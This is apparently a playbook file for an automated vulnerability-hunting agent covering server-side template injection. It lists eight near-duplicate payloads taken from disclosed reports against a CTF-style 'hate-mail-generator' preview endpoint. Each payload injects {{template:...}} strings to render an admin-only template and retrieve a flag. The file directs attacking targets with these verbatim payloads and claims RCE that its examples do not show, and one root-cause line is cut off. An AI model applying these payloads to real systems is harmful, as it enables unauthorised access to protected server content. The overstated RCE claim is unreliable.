---
name: hunter-l4-ssti
description: "Detect and exploit Server-Side Template Injection for RCE with real payloads."
domain: cybersecurity
subdomain: web
tags:
- web
- ssti
- hunting
- l4
version: '1.0'
---
# L4 Playbook: SSTI (hunter)

**L3 technique sheet:** `knowledge/sheets/ssti.md` — (pending L3 synthesis)

## When to use
Attack a target surface for SSTI. Load the L3 sheet for full sub-pattern detail; use the real exemplars below as concrete tests.

## Real validated patterns (from disclosed reports)

### 1065517 [ajaysenr]
- endpoint: `POST /hate-mail-generator/new/preview`
- parameter: `preview_markup, preview_data`
- payload: `preview_markup={{test}}{{email}}&preview_data={"test":"{{template:","email":"38dhs_admins_only_header.html}}"}`
- root cause: The template engine processes user-controlled {{template:...}} strings, allowing inclusion of arbitrary template files.
- impact: Included the admin-only template file 38dhs_admins_only_header.html and obtained flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}.

### 1065583 [ajaysenr]
- endpoint: `POST /hate-mail-generator/new/preview`
- parameter: `preview_markup, preview_data`
- payload: `{{template:38dhs_admins_only_header.html  }}`
- root cause: The template engine processes user-controlled {{template:...}} strings, allowing inclusion of arbitrary template files.
- impact: Included the admin-only template 38dhs_admins_only_header.html and obtained flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}.

### 1066203 [ajaysenr]
- endpoint: `POST /hate-mail-generator/new/preview`
- parameter: `preview_data`
- payload: `{"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}`
- root cause: User-controlled preview_data is rendered as a template, letting an attacker include any server-side template by name.
- impact: Rendered the admin-only 38dhs_admins_only_header.html template and obtained flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}.

### 1066504 [ajaysenr]
- endpoint: `POST /hate-mail-generator/new/preview`
- parameter: `preview_data`
- payload: `{"flag":"{{template:38dhs_admins_only_header.html}}"}`
- root cause: User-controlled preview_data is rendered as a template, letting an attacker include any server-side template by name.
- impact: Rendered the admin-only 38dhs_admins_only_header.html template and obtained flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}.

### 1066851 [ajaysenr]
- endpoint: `POST /hate-mail-generator/new/preview`
- parameter: `preview_data`
- payload: `{"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}`
- root cause: Preview data was rendered as a template without access control, allowing inclusion of an admins-only template file.
- impact: Rendered 38dhs_admins_only_header.html and retrieved flag flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}.

### 1067037 [ajaysenr]
- endpoint: `POST /hate-mail-generator/new/preview`
- parameter: `preview_data`
- payload: `{"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}`
- root cause: Preview data was rendered as a template without access control, allowing inclusion of an admins-only template file.
- impact: Rendered 38dhs_admins_only_header.html and retrieved flag flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}.

### 1067443 [ajaysenr]
- endpoint: `POST /hate-mail-generator/new/preview`
- parameter: `preview_markup, preview_data`
- payload: `preview_markup={{givetemplate}}&preview_data={"name":"Alice","givetemplate":"{{template:38dhs_admins_only_header.html}}"}`
- root cause: preview_data values were substituted into preview_markup and the result re-processed, allowing recursive template inclusion of an admin-only template.
- impact: Loaded admin-only template 38dhs_admins_only_header.html through the preview feature and retrieved the flag.

### 1067835 [ajaysenr]
- endpoint: `POST /hate-mail-generator/new/preview`
- parameter: `name, preview_data`
- payload: `{{template: 38dhs_admins_only_header.html}}`
- root cause: User-controllable fields were rendered as templates, so injecting a template include string into the name field loaded an admin-only template without 
- impact: Loaded admin-only template 38dhs_admins_only_header.html via the preview/name field and retrieved the flag.

## Approach
1. Map endpoints that take identifiers/input (see L3 sheet for shapes).
2. Apply the verbatim payloads above; vary encoding/params.
3. Prove impact with a request+response+impact (evidence gate).

